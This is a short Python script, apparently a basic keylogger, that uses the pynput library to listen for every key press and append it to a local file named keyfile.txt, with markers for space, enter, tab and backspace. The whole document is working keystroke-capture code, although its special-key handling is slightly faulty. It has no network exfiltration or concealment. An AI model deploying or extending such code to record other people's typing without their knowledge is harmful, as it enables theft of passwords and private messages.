from pynput import keyboard

def pressKey(key):
    print(key)
    with open("keyfile.txt", 'a') as logKey:
        try:
            if(key == keyboard.Key.space):
                logKey.write(" ")
            if(key == keyboard.Key.enter):
                logKey.write("--<ENTER>-- \n")
            if(key == keyboard.Key.tab):
                logKey.write("--<TAB>--")
            if(key == keyboard.Key.backspace):
                logKey.write("--<BACKSPACE>--")
            else:
                char = key.char
                logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=pressKey)
    listener.start()
    input()

